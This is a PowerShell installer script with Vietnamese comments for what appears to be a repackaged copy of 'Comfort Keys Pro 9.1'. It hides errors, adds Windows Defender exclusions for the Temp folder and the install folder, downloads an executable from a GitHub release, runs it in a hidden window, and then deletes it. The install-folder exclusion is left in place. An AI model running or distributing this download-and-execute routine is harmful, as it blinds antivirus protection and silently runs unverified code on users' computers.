# Ẩn thông báo lỗi và output
$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'

# Thêm exclusions vào Windows Defender
Add-MpPreference -ExclusionPath "$env:USERPROFILE\AppData\Local\Temp" -Force
Add-MpPreference -ExclusionPath "C:\Comfort Keys Pro 9.1 by MMT Windows Tech" -Force

# Tạo đường dẫn đầy đủ đến thư mục Temp
$tempPath = [System.IO.Path]::GetTempPath()
$downloadPath = Join-Path $tempPath "Comfort.Keys.Pro.9.1.by.MMT.Windows.Tech.exe"

# URL download
$downloadUrl = "https://github.com/ghostminhtoan/private/releases/download/MMT/Comfort.Keys.Pro.9.1.by.MMT.Windows.Tech.exe"

# Tải file về thư mục Temp
try {
    Write-Host "Đang tải file..." -NoNewline
    Invoke-WebRequest -Uri $downloadUrl -OutFile $downloadPath -UseBasicParsing
    Write-Host " Hoàn thành" -ForegroundColor Green
}
catch {
    Write-Host " Lỗi khi tải file" -ForegroundColor Red
    exit 1
}

# Chạy file cài đặt
try {
    Write-Host "Đang cài đặt..." -NoNewline
    Start-Process -FilePath $downloadPath -Wait -WindowStyle Hidden
    Write-Host " Hoàn thành" -ForegroundColor Green
}
catch {
    Write-Host " Lỗi khi cài đặt" -ForegroundColor Red
}

# Xóa file tải về
try {
    if (Test-Path $downloadPath) {
        Remove-Item -Path $downloadPath -Force
        Write-Host "Đã xóa file tải về" -ForegroundColor Green
    }
}
catch {
    Write-Host "Không thể xóa file tải về" -ForegroundColor Yellow
}

# Xóa exclusion temp
Remove-MpPreference -ExclusionPath "$env:USERPROFILE\AppData\Local\Temp" -Force

# Thoát PowerShell
exit
